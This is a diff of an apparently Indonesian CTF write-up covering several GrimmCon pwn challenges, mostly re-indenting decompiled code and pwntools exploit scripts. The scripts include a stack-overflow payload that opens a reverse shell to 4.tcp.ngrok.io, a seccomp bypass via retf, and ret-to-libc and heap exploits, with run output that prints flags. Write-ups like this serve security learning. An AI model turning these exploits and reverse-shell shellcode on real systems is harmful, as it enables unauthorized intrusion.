@@ -20,66 +20,66 @@ main func.
 ```c
 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 {
-  char *v3; // rax@17
-  int optval; // [sp+1Ch] [bp-44h]@7
-  struct sockaddr addr; // [sp+20h] [bp-40h]@17
-  __int16 s; // [sp+30h] [bp-30h]@10
-  uint16_t v7; // [sp+32h] [bp-2Eh]@10
-  uint32_t v8; // [sp+34h] [bp-2Ch]@10
-  socklen_t addr_len; // [sp+4Ch] [bp-14h]@16
-  int v10; // [sp+50h] [bp-10h]@17
-  int v11; // [sp+54h] [bp-Ch]@17
-  int fd; // [sp+58h] [bp-8h]@4
-  int v13; // [sp+5Ch] [bp-4h]@4
+    char *v3; // rax@17
+    int optval; // [sp+1Ch] [bp-44h]@7
+    struct sockaddr addr; // [sp+20h] [bp-40h]@17
+    __int16 s; // [sp+30h] [bp-30h]@10
+    uint16_t v7; // [sp+32h] [bp-2Eh]@10
+    uint32_t v8; // [sp+34h] [bp-2Ch]@10
+    socklen_t addr_len; // [sp+4Ch] [bp-14h]@16
+    int v10; // [sp+50h] [bp-10h]@17
+    int v11; // [sp+54h] [bp-Ch]@17
+    int fd; // [sp+58h] [bp-8h]@4
+    int v13; // [sp+5Ch] [bp-4h]@4
 
-  if ( argc <= 1 )
-  {
+    if ( argc <= 1 )
+    {
     fwrite("Not enough arguments.\n", 1uLL, 0x16uLL, _bss_start);
     fwrite("Usage: ./stacked [port]\n", 1uLL, 0x18uLL, _bss_start);
     exit(1);
-  }
-  v13 = atoi(argv[1]);
-  fd = socket(2, 1, 0);
-  if ( fd == -1 )
-  {
+    }
+    v13 = atoi(argv[1]);
+    fd = socket(2, 1, 0);
+    if ( fd == -1 )
+    {
     fwrite("Failed to create socket.\n", 1uLL, 0x19uLL, _bss_start);
     exit(1);
-  }
-  optval = 1;
-  if ( setsockopt(fd, 1, 2, &optval, 4u) < 0 )
-  {
+    }
+    optval = 1;
+    if ( setsockopt(fd, 1, 2, &optval, 4u) < 0 )
+    {
     fwrite("Error setting socket options.\n", 1uLL, 0x1EuLL, _bss_start);
     exit(1);
-  }
-  bzero(&s, 0x10uLL);
-  s = 2;
-  v8 = htonl(0);
-  v7 = htons(v13);
-  if ( bind(fd, (const struct sockaddr *)&s, 0x10u) )
-  {
+    }
+    bzero(&s, 0x10uLL);
+    s = 2;
+    v8 = htonl(0);
+    v7 = htons(v13);
+    if ( bind(fd, (const struct sockaddr *)&s, 0x10u) )
+    {
     fwrite("Failed to bind socked.\n", 1uLL, 0x17uLL, _bss_start);
     exit(1);
-  }
-  if ( listen(fd, 5) )
-  {
+    }
+    if ( listen(fd, 5) )
+    {
     fwrite("Failed to listen.\n", 1uLL, 0x12uLL, _bss_start);
     exit(1);
-  }
-  fprintf(_bss_start, "Listening on port %d...\n", (unsigned int)v13, argv);
-  addr_len = 16;
-  while ( 1 )
-  {
+    }
+    fprintf(_bss_start, "Listening on port %d...\n", (unsigned int)v13, argv);
+    addr_len = 16;
+    while ( 1 )
+    {
     v11 = accept(fd, &addr, &addr_len);
     v3 = inet_ntoa(*(struct in_addr *)&addr.sa_data[2]);
     fprintf(_bss_start, "Received connection from: %s\n", v3);
     v10 = fork();
     if ( !v10 )
-      break;
+        break;
     close(v11);
-  }
-  handle_client(v11);
-  close(v11);
-  exit(0);
+    }
+    handle_client(v11);
+    close(v11);
+    exit(0);
 }
 ```
 
@@ -88,11 +88,11 @@ Fungsi main hanya melalukan listening ke localhost dengan port merupakan argumen
 ```c
 ssize_t __fastcall handle_client(int a1)
 {
-  char buf; // [sp+10h] [bp-400h]@1
+    char buf; // [sp+10h] [bp-400h]@1
 
-  send(a1, "Overflow me!\n", 0xDuLL, 0);
-  send(a1, "> ", 2uLL, 0);
-  return recv(a1, &buf, 0x800uLL, 0);
+    send(a1, "Overflow me!\n", 0xDuLL, 0);
+    send(a1, "> ", 2uLL, 0);
+    return recv(a1, &buf, 0x800uLL, 0);
 }
 ```
 
@@ -127,33 +127,33 @@ context.arch = 'amd64'
 gdbscript = ''''''
 
 def debug(gdbscript):
-   if type(r) == process:
-      gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])
+    if type(r) == process:
+        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])
 
 def exploit(r):
-   p = 'a'*0x408
-   p += p64(elf.sym['useful'])
-   p += asm(shellcraft.connect('4.tcp.ngrok.io', 15625))
-   p += asm(shellcraft.dup2("rbp", 0))
-   p += asm(shellcraft.dup2("rbp", 1))
-   p += asm(shellcraft.dup2("rbp", 2))
-   p += asm(shellcraft.sh())
-   
-   r.sendlineafter("> ", p)
+    p = 'a'*0x408
+    p += p64(elf.sym['useful'])
+    p += asm(shellcraft.connect('4.tcp.ngrok.io', 15625))
+    p += asm(shellcraft.dup2("rbp", 0))
+    p += asm(shellcraft.dup2("rbp", 1))
+    p += asm(shellcraft.dup2("rbp", 2))
+    p += asm(shellcraft.sh())
+    
+    r.sendlineafter("> ", p)
 
-   r.interactive()
+    r.interactive()
 
 if __name__ == '__main__':
-   if len(sys.argv) > 1:
-      r = remote("challenge.ctf.games", sys.argv[1])
-   else:
-      r = process(ELF_PATH, aslr=0)
-   exploit(r)
+    if len(sys.argv) > 1:
+        r = remote("challenge.ctf.games", sys.argv[1])
+    else:
+        r = process(ELF_PATH, aslr=0)
+    exploit(r)
 ```
 
 profit.
 
-```python
+```
 $ nc -vlp 4444
 Listening on [0.0.0.0] (family 0, port 4444)
 Connection from localhost 57362 received!
@@ -183,11 +183,11 @@ Hanya singkat, write dan read.
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  char buf; // [sp+0h] [bp-200h]@1
+    char buf; // [sp+0h] [bp-200h]@1
 
-  write(1, &unk_402004, 2uLL);
-  read(0, &buf, 0x400uLL);
-  return 0;
+    write(1, &unk_402004, 2uLL);
+    read(0, &buf, 0x400uLL);
+    return 0;
 }
 ```
 
@@ -262,7 +262,7 @@ if __name__ == '__main__':
 
 ret-to-libc for profil.
 
-```python
+```
 $ python solver.py 31322
 [*] '/home/abdullahnz/ctf/grimmcon/pwn/patches/patches'
     Arch:     amd64-64-little
@@ -308,25 +308,25 @@ Custom canary, if we can leak that, we got 2 leaks. *saved_canary* first, then x
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  char s; // [sp+0h] [bp-30h]@1
-  unsigned __int64 v5; // [sp+28h] [bp-8h]@1
+    char s; // [sp+0h] [bp-30h]@1
+    unsigned __int64 v5; // [sp+28h] [bp-8h]@1
 
-  setup(*(_QWORD *)&argc, argv, envp);
-  v5 = (unsigned __int64)&printf ^ 0x123456789ABCDEF1LL;
-  saved_canary = (unsigned __int64)&printf ^ 0x123456789ABCDEF1LL;
-  memset(&s, 0, 0x28uLL);
-  puts("Do you think you can overflow me?");
-  read(0, &s, 0x40uLL);
-  puts(&s);
-  memset(&s, 0, 0x28uLL);
-  puts("Are you sure you overflowed it right? Try again.");
-  read(0, &s, 0x40uLL);
-  if ( v5 != saved_canary )
-  {
-    puts("Nope. :(");
-    exit(0);
-  }
-  return 0;
+    setup(*(_QWORD *)&argc, argv, envp);
+    v5 = (unsigned __int64)&printf ^ 0x123456789ABCDEF1LL;
+    saved_canary = (unsigned __int64)&printf ^ 0x123456789ABCDEF1LL;
+    memset(&s, 0, 0x28uLL);
+    puts("Do you think you can overflow me?");
+    read(0, &s, 0x40uLL);
+    puts(&s);
+    memset(&s, 0, 0x28uLL);
+    puts("Are you sure you overflowed it right? Try again.");
+    read(0, &s, 0x40uLL);
+    if ( v5 != saved_canary )
+    {
+        puts("Nope. :(");
+        exit(0);
+    }
+    return 0;
 }
 ```
 
@@ -396,7 +396,7 @@ if __name__ == '__main__':
 
 Run and got the flag~.
 
-```python
+```
 $ python solver.py 30824
 [+] Opening connection to challenge.ctf.games on port 30824: Done
 [*] leak 0x7fec3b993f70
@@ -426,33 +426,33 @@ flag{e87923d7cd36a8580d0cf78656d457c6}
 I set up a secure environment for users to execute shellcode. Now nobody will be able to get the flag!
 
 
-### run_sandbox
+### run_sandbox binary
 
-seccomp dump:
+Blacklist syscall numbers.
 
 ```
-   line  CODE  JT   JF      K
-   =================================
-   0000: 0x20 0x00 0x00 0x00000004  A = arch
-   0001: 0x20 0x00 0x00 0x00000000  A = sys_number
-   0002: 0x25 0x0c 0x00 0x3fffffff  if (A > 0x3fffffff) goto 0015
-   0003: 0x15 0x0b 0x00 0x00000059  if (A == readlink) goto 0015
-   0004: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0015
-   0005: 0x15 0x09 0x00 0x00000038  if (A == clone) goto 0015
-   0006: 0x15 0x08 0x00 0x00000039  if (A == fork) goto 0015
-   0007: 0x15 0x07 0x00 0x0000003a  if (A == vfork) goto 0015
-   0008: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0015
-   0009: 0x15 0x05 0x00 0x00000055  if (A == creat) goto 0015
-   0010: 0x15 0x04 0x00 0x00000101  if (A == openat) goto 0015
-   0011: 0x15 0x03 0x00 0x00000142  if (A == execveat) goto 0015
-   0012: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0015
-   0013: 0x15 0x01 0x00 0x00000011  if (A == pread64) goto 0015
-   0014: 0x15 0x00 0x01 0x00000013  if (A != readv) goto 0016
-   0015: 0x06 0x00 0x00 0x00000000  return KILL
-   0016: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+    line  CODE  JT   JF      K
+    =================================
+    0000: 0x20 0x00 0x00 0x00000004  A = arch
+    0001: 0x20 0x00 0x00 0x00000000  A = sys_number
+    0002: 0x25 0x0c 0x00 0x3fffffff  if (A > 0x3fffffff) goto 0015
+    0003: 0x15 0x0b 0x00 0x00000059  if (A == readlink) goto 0015
+    0004: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0015
+    0005: 0x15 0x09 0x00 0x00000038  if (A == clone) goto 0015
+    0006: 0x15 0x08 0x00 0x00000039  if (A == fork) goto 0015
+    0007: 0x15 0x07 0x00 0x0000003a  if (A == vfork) goto 0015
+    0008: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0015
+    0009: 0x15 0x05 0x00 0x00000055  if (A == creat) goto 0015
+    0010: 0x15 0x04 0x00 0x00000101  if (A == openat) goto 0015
+    0011: 0x15 0x03 0x00 0x00000142  if (A == execveat) goto 0015
+    0012: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0015
+    0013: 0x15 0x01 0x00 0x00000011  if (A == pread64) goto 0015
+    0014: 0x15 0x00 0x01 0x00000013  if (A != readv) goto 0016
+    0015: 0x06 0x00 0x00 0x00000000  return KILL
+    0016: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 ```
 
-Tidak bisa inject shellcode execve, execveat, karena di blacklist. open-read-write juga diblacklist. Syscall ABI? tidak bisa karena diblacklist.
+Tidak bisa inject shellcode execve, execveat, karena di blacklist. open-read-write juga diblacklist. Syscall ABI? tidak bisa yang di-*allow* hanya kurang dari 0x3fffffff.
 
 Solusi? yeah. `retf intruction`.
 
@@ -460,7 +460,7 @@ Intruksi ini akan pop 2 value, yaitu di *cs* dan *ip*. Jika value *cs* ini 0x23,
 
 Nah ini cukup mem-*bypass* filter diatas. Karena *syscall_number* di 32 bit itu beda sama 64 bit. Tapi execve tidak bisa dilakukan, karena ter-blacklist juga.
 
-```c
+```python
 #!/usr/bin/python
 
 from pwn import *
@@ -468,35 +468,35 @@ from pwn import *
 context.arch = 'amd64'
 
 shellcode = '''
-   sub rbp, 0xff8
-   mov rsp, rbp
-   add rsp, 0x10
-   push 0x23
-   sub rsp, 0x4
-   add rdi, 0x1d
-   add [rsp], rdi
-   retf
-   
-   push 0x74
-   push 0x78742e67
-   push 0x616c662f
-   mov eax, 5
-   mov ebx, esp
-   xor ecx, ecx
-   xor edx, edx
-   int 0x80
+    sub rbp, 0xff8
+    mov rsp, rbp
+    add rsp, 0x10
+    push 0x23
+    sub rsp, 0x4
+    add rdi, 0x1d
+    add [rsp], rdi
+    retf
+    
+    push 0x74
+    push 0x78742e67
+    push 0x616c662f
+    mov eax, 5
+    mov ebx, esp
+    xor ecx, ecx
+    xor edx, edx
+    int 0x80
 
-   mov ebx, eax
-   mov ecx, esp
-   mov edx, 0x50
-   mov eax, 3
-   int 0x80
-   
-   mov eax, 4
-   mov ebx, 1
-   mov ecx, esp
-   mov edx, 0x50
-   int 0x80
+    mov ebx, eax
+    mov ecx, esp
+    mov edx, 0x50
+    mov eax, 3
+    int 0x80
+    
+    mov eax, 4
+    mov ebx, 1
+    mov ecx, esp
+    mov edx, 0x50
+    int 0x80
 '''
 
 def upload_file(raw):
@@ -535,9 +535,9 @@ Kira-kira, struktur data-nya *begini*,
 
 ```c
 struct Config {
-   int id;
-   char *setting;
-   char is_active;
+    int id;
+    char *setting;
+    char is_active;
 }
 ```
 
@@ -548,31 +548,31 @@ Difungsi ini, hanya input id, size, lalu setting config diallokasikan menggunaka
 ```c
 __int64 __fastcall add_config(__int64 a1)
 {
-  const char *v1; // rbx@1
-  char v3; // [sp+1Bh] [bp-35h]@1
-  int n; // [sp+1Ch] [bp-34h]@1
-  char s; // [sp+20h] [bp-30h]@1
-  __int64 v6; // [sp+38h] [bp-18h]@1
+    const char *v1; // rbx@1
+    char v3; // [sp+1Bh] [bp-35h]@1
+    int n; // [sp+1Ch] [bp-34h]@1
+    char s; // [sp+20h] [bp-30h]@1
+    __int64 v6; // [sp+38h] [bp-18h]@1
 
-  v6 = *MK_FP(__FS__, 40LL);
-  printf("What is the id of the config?: ");
-  fgets(&s, 16, stdin);
-  *(_DWORD *)a1 = atoi(&s);
-  memset(&s, 0, 0x10uLL);
-  printf("What is the size of the setting?: ", 0LL);
-  fgets(&s, 16, stdin);
-  n = atoi(&s);
-  *(_QWORD *)(a1 + 8) = malloc(n);
-  printf("What is the setting to be added?: ", 16LL);
-  fgets(*(char **)(a1 + 8), n, stdin);
-  v1 = *(const char **)(a1 + 8);
-  v1[strcspn(v1, "\r\n")] = 0;
-  printf("Should this setting be active? [y/n]: ", "\r\n");
-  __isoc99_scanf(" %c", &v3);
-  getchar();
-  *(_BYTE *)(a1 + 16) = v3 == 121;
-  puts("\nConfig added.\n");
-  return v6 - *MK_FP(__FS__, 40LL);
+    v6 = *MK_FP(__FS__, 40LL);
+    printf("What is the id of the config?: ");
+    fgets(&s, 16, stdin);
+    *(_DWORD *)a1 = atoi(&s);
+    memset(&s, 0, 0x10uLL);
+    printf("What is the size of the setting?: ", 0LL);
+    fgets(&s, 16, stdin);
+    n = atoi(&s);
+    *(_QWORD *)(a1 + 8) = malloc(n);
+    printf("What is the setting to be added?: ", 16LL);
+    fgets(*(char **)(a1 + 8), n, stdin);
+    v1 = *(const char **)(a1 + 8);
+    v1[strcspn(v1, "\r\n")] = 0;
+    printf("Should this setting be active? [y/n]: ", "\r\n");
+    __isoc99_scanf(" %c", &v3);
+    getchar();
+    *(_BYTE *)(a1 + 16) = v3 == 121;
+    puts("\nConfig added.\n");
+    return v6 - *MK_FP(__FS__, 40LL);
 }
 ```
 
@@ -583,40 +583,40 @@ Realloc data yang sudah diallokasikan, berdasarkan index config.
 ```c
 __int64 __fastcall edit_config(__int64 a1, int a2)
 {
-  int *v2; // rbx@1
-  __int64 v3; // rbx@1
-  __int64 v4; // rsi@1
-  const char *v5; // rbx@1
-  int v7; // [sp+4h] [bp-4Ch]@1
-  char v8; // [sp+1Bh] [bp-35h]@1
-  int n; // [sp+1Ch] [bp-34h]@1
-  char s; // [sp+20h] [bp-30h]@1
-  __int64 v11; // [sp+38h] [bp-18h]@1
+    int *v2; // rbx@1
+    __int64 v3; // rbx@1
+    __int64 v4; // rsi@1
+    const char *v5; // rbx@1
+    int v7; // [sp+4h] [bp-4Ch]@1
+    char v8; // [sp+1Bh] [bp-35h]@1
+    int n; // [sp+1Ch] [bp-34h]@1
+    char s; // [sp+20h] [bp-30h]@1
+    __int64 v11; // [sp+38h] [bp-18h]@1
 
-  v7 = a2;
-  v11 = *MK_FP(__FS__, 40LL);
-  printf("What is the new ID?: ");
-  fgets(&s, 16, stdin);
-  v2 = *(8LL * a2 + a1);
-  *v2 = atoi(&s);
-  memset(&s, 0, 0x10uLL);
-  printf("What is the new size of the setting?: ", 0LL);
-  fgets(&s, 16, stdin);
-  n = atoi(&s);
-  v3 = *(8LL * a2 + a1);
-  v4 = n;
-  *(v3 + 8) = realloc(*(*(8LL * v7 + a1) + 8LL), n);
-  printf("What is the new setting?: ", v4);
-  fgets(*(*(8LL * v7 + a1) + 8LL), n, stdin);
-  v5 = *(*(8LL * v7 + a1) + 8LL);
-  v5[strcspn(v5, "\r\n")] = 0;
-  printf("Should this be active? [y/n]: ", "\r\n");
-  __isoc99_scanf(" %c", &v8);
-  getchar();
-  *(*(8LL * v7 + a1) + 16LL) = v8 == 121;
-  putchar(10);
-  puts("Config Edited.");
-  return v11 - *MK_FP(__FS__, 40LL);
+    v7 = a2;
+    v11 = *MK_FP(__FS__, 40LL);
+    printf("What is the new ID?: ");
+    fgets(&s, 16, stdin);
+    v2 = *(8LL * a2 + a1);
+    *v2 = atoi(&s);
+    memset(&s, 0, 0x10uLL);
+    printf("What is the new size of the setting?: ", 0LL);
+    fgets(&s, 16, stdin);
+    n = atoi(&s);
+    v3 = *(8LL * a2 + a1);
+    v4 = n;
+    *(v3 + 8) = realloc(*(*(8LL * v7 + a1) + 8LL), n);
+    printf("What is the new setting?: ", v4);
+    fgets(*(*(8LL * v7 + a1) + 8LL), n, stdin);
+    v5 = *(*(8LL * v7 + a1) + 8LL);
+    v5[strcspn(v5, "\r\n")] = 0;
+    printf("Should this be active? [y/n]: ", "\r\n");
+    __isoc99_scanf(" %c", &v8);
+    getchar();
+    *(*(8LL * v7 + a1) + 16LL) = v8 == 121;
+    putchar(10);
+    puts("Config Edited.");
+    return v11 - *MK_FP(__FS__, 40LL);
 }
 ```
 
@@ -627,11 +627,11 @@ Hanya melakukan printing data-data config yang sudah dialokasikan.
 ```c
 int __fastcall print_config(__int64 a1, int a2)
 {
-  putchar(10);
-  printf("ID: %d\n", **(8LL * a2 + a1));
-  printf("Setting: %s\n", *(*(8LL * a2 + a1) + 8LL));
-  printf("Is active: %d\n", *(*(8LL * a2 + a1) + 16LL));
-  return putchar(10);
+    putchar(10);
+    printf("ID: %d\n", **(8LL * a2 + a1));
+    printf("Setting: %s\n", *(*(8LL * a2 + a1) + 8LL));
+    printf("Is active: %d\n", *(*(8LL * a2 + a1) + 16LL));
+    return putchar(10);
 }
 ```
 
@@ -802,7 +802,7 @@ if __name__ == '__main__':
 
 This chall, only 1 team solve this lol. Yeah its me lol.
 
-```py
+```
 [+] Opening connection to challenge.ctf.games on port 31213: Done
 [*] leak 0x7f6fb0456ca0
 [*] libc 0x7f6fb006b000
@@ -819,7 +819,12 @@ drwxr-xr-x 1 root 0  4096 Dec 28 17:47 usr
 ---x--x--x 1 root 0 17344 Dec 28 17:46 waf
 $ cat flag.txt
 flag{dc75c408f5ba2fbc72b307987dddc775}
-$ 
+
 [*] Interrupted
 [*] Closed connection to challenge.ctf.games port 31213
 ```
+
+### Flag 
+
+`flag{dc75c408f5ba2fbc72b307987dddc775}`
+
